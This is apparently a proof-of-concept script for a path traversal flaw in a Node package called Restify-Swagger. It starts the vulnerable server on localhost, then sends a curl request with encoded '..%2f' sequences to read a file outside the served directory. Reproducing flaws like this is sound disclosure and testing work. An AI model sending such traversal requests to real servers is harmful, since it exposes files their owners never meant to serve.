RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# start the server
echo "[${GREEN}start vulnerable server${NC}]: ${BLUE}Restify-Swagger${NC}"
node PoC.js -d . >/dev/null 2>&1  &
vulnpid=$!

# wait for the server to get started
sleep 1s

echo "[${GREEN} Path Traversal ${NC}]: ${BLUE}http://localhost/pateta/..%2f..%2f..%2fdoc/vuln.txt${NC}"

# utilize directory traversal to get files outside the working directory
curl http://localhost/doc/..%2f..%2f..%2fdoc/vuln.txt

echo 
# kill the vulnerable npm package's process
kill -9 $vulnpid
